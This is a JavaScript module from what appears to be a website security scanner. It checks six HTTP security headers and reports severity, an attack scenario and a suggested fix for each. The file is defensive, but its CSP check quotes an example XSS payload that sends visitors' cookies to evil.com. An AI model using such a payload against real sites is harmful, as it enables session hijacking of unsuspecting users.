/**
 * headers.js — Checks 5-10: HTTP Security Headers
 * CHECK 5: Content Security Policy
 * CHECK 6: X-Frame-Options / Clickjacking
 * CHECK 7: X-Content-Type-Options
 * CHECK 8: Referrer-Policy
 * CHECK 9: Permissions-Policy
 * CHECK 10: X-XSS-Protection
 */

const axios = require('axios');

const TIMEOUT = 8000;
const USER_AGENT = 'ShieldScan-SecurityBot/1.0 (security scanner)';

async function fetchHeaders(url) {
  const response = await axios.get(url, {
    maxRedirects: 5,
    validateStatus: () => true,
    headers: { 'User-Agent': USER_AGENT },
    timeout: TIMEOUT,
  });
  return response.headers;
}

// CHECK 5 — Content Security Policy
async function checkCsp(parsedUrl) {
  const base = {
    checkId: 'csp',
    checkNumber: 5,
    category: 'HTTP Headers',
    name: 'Content Security Policy (CSP)',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const csp = headers['content-security-policy'] || headers['content-security-policy-report-only'];

    if (!csp) {
      return {
        ...base, severity: 'HIGH', status: 'FAIL',
        description: 'Content-Security-Policy header is missing',
        technicalDetail: 'No CSP header found in response',
        attackScenario: "An attacker finds a comment box on your site and injects <script>document.location='https://evil.com/steal?c='+document.cookie</script>. Without CSP, the browser executes this and sends every visitor's session cookie to the attacker's server.",
        fix: {
          description: 'Add a strict Content Security Policy',
          code: `# Express.js
res.setHeader('Content-Security-Policy', 
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none';"
);

# Nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; frame-ancestors 'none';" always;`,
        },
        points_deducted: 10,
      };
    }

    const hasUnsafeInline = csp.includes("'unsafe-inline'");
    const hasUnsafeEval = csp.includes("'unsafe-eval'");
    const issues = [];
    if (hasUnsafeInline) issues.push("'unsafe-inline' allows inline scripts");
    if (hasUnsafeEval) issues.push("'unsafe-eval' allows eval() execution");

    if (issues.length > 0) {
      return {
        ...base, severity: 'MEDIUM', status: 'WARNING',
        description: `CSP present but weakened by unsafe directives: ${issues.join(', ')}`,
        technicalDetail: `Content-Security-Policy: ${csp.substring(0, 200)}`,
        attackScenario: "The CSP header is present but 'unsafe-inline' allows inline JavaScript, defeating most XSS protection. An attacker can still inject and execute inline scripts on the page.",
        fix: {
          description: "Remove 'unsafe-inline' and 'unsafe-eval' from your CSP",
          code: `# Instead of 'unsafe-inline', use nonces:
Content-Security-Policy: script-src 'self' 'nonce-{random}';
# Add nonce to each script tag: <script nonce="{random}">`,
        },
        points_deducted: 5,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: 'Content Security Policy is properly configured',
      technicalDetail: `Content-Security-Policy: ${csp.substring(0, 150)}...`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `CSP check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

// CHECK 6 — X-Frame-Options / Clickjacking
async function checkClickjacking(parsedUrl) {
  const base = {
    checkId: 'clickjacking',
    checkNumber: 6,
    category: 'HTTP Headers',
    name: 'X-Frame-Options / Clickjacking Protection',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const xfo = headers['x-frame-options'];
    const csp = headers['content-security-policy'] || '';
    const hasFrameAncestors = csp.toLowerCase().includes('frame-ancestors');

    if (!xfo && !hasFrameAncestors) {
      return {
        ...base, severity: 'HIGH', status: 'FAIL',
        description: 'No clickjacking protection — X-Frame-Options or CSP frame-ancestors missing',
        technicalDetail: 'No X-Frame-Options header or CSP frame-ancestors directive found',
        attackScenario: "An attacker creates a page at evil.com and embeds your site in a transparent <iframe> on top of a fake 'Win a Prize!' button. When users click what they think is the prize button, they're actually clicking your 'Confirm Transfer' or 'Delete Account' button on your invisible site beneath.",
        fix: {
          description: 'Add X-Frame-Options header to prevent embedding in iframes',
          code: `# Nginx
add_header X-Frame-Options "DENY" always;

# Express.js
res.setHeader('X-Frame-Options', 'DENY');
# OR use CSP (preferred modern approach):
res.setHeader('Content-Security-Policy', "frame-ancestors 'none';");`,
        },
        points_deducted: 10,
      };
    }

    const xfoValue = xfo ? xfo.toUpperCase() : '';
    const isSecure = xfoValue === 'DENY' || xfoValue === 'SAMEORIGIN' || hasFrameAncestors;

    if (!isSecure) {
      return {
        ...base, severity: 'MEDIUM', status: 'WARNING',
        description: `X-Frame-Options set to weak value: ${xfo}`,
        technicalDetail: `X-Frame-Options: ${xfo}`,
        attackScenario: "ALLOWALL or wildcard frame-options allows any site to embed your pages, enabling clickjacking attacks.",
        fix: { description: "Set X-Frame-Options to DENY or SAMEORIGIN", code: "X-Frame-Options: DENY" },
        points_deducted: 5,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: `Clickjacking protection in place: ${xfo || 'CSP frame-ancestors'}`,
      technicalDetail: `X-Frame-Options: ${xfo || 'N/A'}, CSP frame-ancestors: ${hasFrameAncestors}`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `Clickjacking check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

// CHECK 7 — X-Content-Type-Options
async function checkContentTypeOptions(parsedUrl) {
  const base = {
    checkId: 'content_type_options',
    checkNumber: 7,
    category: 'HTTP Headers',
    name: 'X-Content-Type-Options',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const xcto = headers['x-content-type-options'];

    if (!xcto || xcto.toLowerCase() !== 'nosniff') {
      return {
        ...base, severity: 'MEDIUM', status: 'FAIL',
        description: `X-Content-Type-Options: nosniff is ${xcto ? 'incorrectly set to "' + xcto + '"' : 'missing'}`,
        technicalDetail: `X-Content-Type-Options: ${xcto || 'not present'}`,
        attackScenario: "An attacker uploads a file named 'profile.jpg' that actually contains JavaScript code. Without nosniff, the browser detects the script content and executes it as JavaScript, even though it was served as an image. This is MIME sniffing exploitation.",
        fix: {
          description: 'Add X-Content-Type-Options: nosniff header',
          code: `# Nginx
add_header X-Content-Type-Options "nosniff" always;

# Express.js
res.setHeader('X-Content-Type-Options', 'nosniff');`,
        },
        points_deducted: 5,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: 'X-Content-Type-Options: nosniff is properly set',
      technicalDetail: `X-Content-Type-Options: ${xcto}`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `X-Content-Type-Options check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

// CHECK 8 — Referrer-Policy
async function checkReferrerPolicy(parsedUrl) {
  const base = {
    checkId: 'referrer_policy',
    checkNumber: 8,
    category: 'HTTP Headers',
    name: 'Referrer-Policy',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const rp = headers['referrer-policy'];
    const unsafePolicies = ['unsafe-url', 'no-referrer-when-downgrade'];

    if (!rp) {
      return {
        ...base, severity: 'LOW', status: 'FAIL',
        description: 'Referrer-Policy header is missing',
        technicalDetail: 'No Referrer-Policy header found',
        attackScenario: "Your app has URLs like /account?token=eyJhbGciOiJIUzI1NiJ9... When a user clicks an external link from your site, their full URL (including the token) is sent to the third-party site in the Referer header. The third-party site owner can now use that token to log in as your user.",
        fix: {
          description: 'Add Referrer-Policy header',
          code: `# Nginx
add_header Referrer-Policy "strict-origin-when-cross-origin" always;

# Express.js
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');`,
        },
        points_deducted: 2,
      };
    }

    if (unsafePolicies.some(p => rp.toLowerCase().includes(p))) {
      return {
        ...base, severity: 'LOW', status: 'WARNING',
        description: `Referrer-Policy set to potentially unsafe value: ${rp}`,
        technicalDetail: `Referrer-Policy: ${rp}`,
        attackScenario: "The unsafe-url policy sends the full URL including query parameters to all external sites, potentially leaking sensitive tokens or user data.",
        fix: { description: "Change Referrer-Policy to strict-origin-when-cross-origin", code: "Referrer-Policy: strict-origin-when-cross-origin" },
        points_deducted: 2,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: `Referrer-Policy is set: ${rp}`,
      technicalDetail: `Referrer-Policy: ${rp}`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `Referrer-Policy check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

// CHECK 9 — Permissions-Policy
async function checkPermissionsPolicy(parsedUrl) {
  const base = {
    checkId: 'permissions_policy',
    checkNumber: 9,
    category: 'HTTP Headers',
    name: 'Permissions-Policy',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const pp = headers['permissions-policy'] || headers['feature-policy'];

    if (!pp) {
      return {
        ...base, severity: 'LOW', status: 'FAIL',
        description: 'Permissions-Policy header is missing',
        technicalDetail: 'No Permissions-Policy or Feature-Policy header found',
        attackScenario: "If an attacker gets any JavaScript running on your page (via XSS or a compromised ad network), without Permissions-Policy they can silently activate the user's camera, microphone, and GPS location. Users see no indication this is happening.",
        fix: {
          description: 'Add Permissions-Policy header to restrict browser features',
          code: `# Nginx
add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;

# Express.js
res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');`,
        },
        points_deducted: 2,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: 'Permissions-Policy header is configured',
      technicalDetail: `Permissions-Policy: ${pp.substring(0, 150)}`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `Permissions-Policy check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

// CHECK 10 — X-XSS-Protection
async function checkXssProtection(parsedUrl) {
  const base = {
    checkId: 'xss_protection',
    checkNumber: 10,
    category: 'HTTP Headers',
    name: 'X-XSS-Protection',
  };
  try {
    const headers = await fetchHeaders(parsedUrl.href);
    const xxp = headers['x-xss-protection'];

    if (!xxp) {
      return {
        ...base, severity: 'LOW', status: 'FAIL',
        description: 'X-XSS-Protection header is missing (affects older browsers)',
        technicalDetail: 'No X-XSS-Protection header found',
        attackScenario: "Older browsers (IE, pre-2019 Chrome) rely on this header to block reflected XSS attacks. Without it, an attacker can send a user a crafted link that injects and executes JavaScript in the victim's browser session.",
        fix: {
          description: 'Add X-XSS-Protection header for legacy browser protection',
          code: `# Nginx
add_header X-XSS-Protection "1; mode=block" always;

# Express.js
res.setHeader('X-XSS-Protection', '1; mode=block');`,
        },
        points_deducted: 2,
      };
    }

    return {
      ...base, severity: 'INFO', status: 'PASS',
      description: `X-XSS-Protection is set: ${xxp}`,
      technicalDetail: `X-XSS-Protection: ${xxp}`,
      attackScenario: null, fix: null, points_deducted: 0,
    };
  } catch (err) {
    return { ...base, severity: 'INFO', status: 'ERROR', description: `X-XSS-Protection check failed: ${err.message}`, technicalDetail: err.message, attackScenario: null, fix: null, points_deducted: 0 };
  }
}

module.exports = { checkCsp, checkClickjacking, checkContentTypeOptions, checkReferrerPolicy, checkPermissionsPolicy, checkXssProtection };
